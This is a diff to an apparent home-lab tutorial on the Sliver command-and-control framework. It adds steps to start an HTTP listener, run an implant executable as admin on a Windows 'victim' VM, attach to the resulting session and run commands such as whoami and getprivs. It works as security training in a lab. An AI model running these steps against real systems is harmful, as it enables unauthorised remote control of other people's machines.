@@ -201,17 +201,42 @@ CRTL + C to kill the http server
 
 exit out of sliver-server with "exit"
 
-and Relaunch sliver-server.
+and Relaunch sliver-server:
 ```
 sliver-server
+```
+And start our HTTP listener:
+```
+http
 ```
 
 #### Now, we are back with our Victim (The Windows O.S. VM)
 
-Time to plan the bomb, as admin from the Terminal, run:
+Time to plant the bomb, as admin from the Terminal, run:
 ```
-C:\Users\User\Downloads\<your_C2-implant>.exe
+C:\Users\User\Downloads\ELECTRIC_BIDET.exe
 ```
+(Don't forget to replace the Name with your payload name).
 
+On the Attacker VM we should see the session or sessions reporting in. To confirm their status, run 'sessions"
 
+If you see one or more sessions, pointing to our Victim VM, we are ready to establish a command anc control attack.
 
+![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/c2-ready.png)
+
+Run this command, along with the session ID to establish a connection.
+```
+use 2a2c8e64
+```
+We are connected, and ready to fire.
+
+To put this to test, you may fire some commands, like
+```
+info
+whoami
+getprivs
+```
+This output confirma we are ready to do some mock-damage:
+![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/Test-commands-c2.png)
+
+Next part - Coming Soon.
